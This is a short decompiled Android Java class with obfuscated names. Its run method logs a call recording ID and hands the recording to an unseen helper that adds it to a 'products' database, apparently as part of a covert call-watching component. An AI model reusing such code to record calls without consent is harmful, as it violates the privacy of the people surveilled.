package com.network.android;

import android.content.Context;
import com.network.android.c.a.a;
import com.network.media.r;

/* access modifiers changed from: package-private */
public final class e implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ String f76a;
    final /* synthetic */ Context b;
    final /* synthetic */ String c;

    e(String str, Context context, String str2) {
        this.f76a = str;
        this.b = context;
        this.c = str2;
    }

    public final void run() {
        try {
            a.a("AndroidCallDirectWatcher getCall recording ID: " + this.f76a);
            Context context = this.b;
            r.a(this.f76a, this.c);
        } catch (Throwable th) {
            a.a("AndroidCallDirectWatcher getCall addRecordFileToProductsDB" + th.getMessage(), th);
        }
    }
}
